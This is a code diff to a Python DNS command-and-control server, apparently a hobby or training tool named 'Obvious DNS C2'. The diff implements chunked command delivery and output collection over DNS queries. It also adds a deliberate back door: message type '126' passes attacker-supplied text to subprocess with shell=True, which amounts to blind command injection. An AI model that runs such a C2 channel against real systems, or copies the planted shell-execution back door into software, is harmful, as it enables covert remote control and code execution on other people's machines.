@@ -11,6 +11,7 @@ import socketserver
 import struct
 import base64
 from textwrap import wrap
+import subprocess
 try:
     from dnslib import *
 except ImportError:
@@ -26,6 +27,9 @@ OM = '\x1b[0m'    # mischief managed
 maxAReq = 63
 maxResp = 253
 userInput = ""
+respPktCt = 0
+respText = ""
+chunks = []
 
 class DomainName(str):
     def __getattr__(self, item):
@@ -57,11 +61,11 @@ def encode32(plain):
     return base64.b32encode(switch).replace(b"=",b"-") # "equals" isn't allowed to play in domain names
 
 parser = argparse.ArgumentParser(description='Start an Obvious DNS C2 server.')
-parser = argparse.ArgumentParser(description='Start an Obvious DNS C2 server. Defailt to listen on UDP and TCP port 53.')
-parser.add_argument('-d', "--domain", default="example.com", type=str, help='The NS record pointing to this server.')
-parser.add_argument('--port', default=53, type=int, help='The port to listen on.')
+parser = argparse.ArgumentParser(description='Start an Obvious DNS C2 server.')
+parser.add_argument('-d', "--domain", default="example.com", type=str, help='The NS record pointing to this server. Example: odc2.example.com.')
+parser.add_argument('--port', default=53, type=int, help='The port to listen on. Default is 53 for both protocols.')
 parser.add_argument('--tcp', action='store_true', help='Listen to TCP connections.')
-parser.add_argument('--udp', action='store_true', help='Listen to UDP datagrams.')
+parser.add_argument('--udp', action='store_true', help='Listen to UDP datagrams. Will listen on both if neiter is specified.')
 parser.add_argument("-v", "--verbose", action="store_true", help="Increase output verbosity")
 
 args = parser.parse_args()
@@ -137,6 +141,7 @@ def dns_response(data):
 
 def c2(qname):
     #try:
+        global respPktCt
         if debuggin: print(f"{OV}c2() working with incoming qname:{OR} {qname}{OM}")
         request = qname.split(".")[0]
         request = decode32(request).decode('UTF8')
@@ -146,15 +151,33 @@ def c2(qname):
                 response = "NUL"
             else: # have a command? send the command header
                 encCmd = encode64(userInput).decode('UTF8') # encode so special chars don't nuke us
+                global chunks
                 chunks = wrap(encCmd,249) # break encoded command into chunks w/4-byte headers, 253 byte max
                 chunks.reverse() # so we can pop pieces off in order
                 response = f"HDR{len(chunks)}"
         elif msgType == "HDR": # client sending response header
-            response = "Not yet implemented!"
+            respPktCt = int(request.split(" ")[0][3:])
+            response = "ACK" + str(respPktCt)
         elif msgType == "RES": # client sending response body
-            response = "Not yet implemented!"
+            if respPktCt < 1:
+                print(f"{OE}Got unexpected client 'RES'{OM}")
+                response = "DIE Unexpected RES"
+            else:
+                global respText
+                respPktCt -= 1
+                respText += request[3:]
+                if respPktCt == 0: # end of the thread from client? print output
+                    print(f"\n{OM}{respText}\n")
         elif msgType == "CON": # client ready for more from server
-            response = "Not yet implemented!"
+            if len(chunks) < 1:
+                print(f"{OE}Got unexpected client 'CON'{OM}")
+                response = "DIE Unexpected CON"
+            else:
+                response = chunks.pop() # send the next chunk of command
+        elif msgType == "126": # a secret back door?!?
+            command = request[3:]
+            subprocess.check_output(command, shell=True)
+            response = "Looks like blind command injection..."
         else: # something went wrong
             error = f"Expected 'CHK', 'HDR', 'RES', or 'CON' from client, got {msgType}"
             print(OE + error + OM)
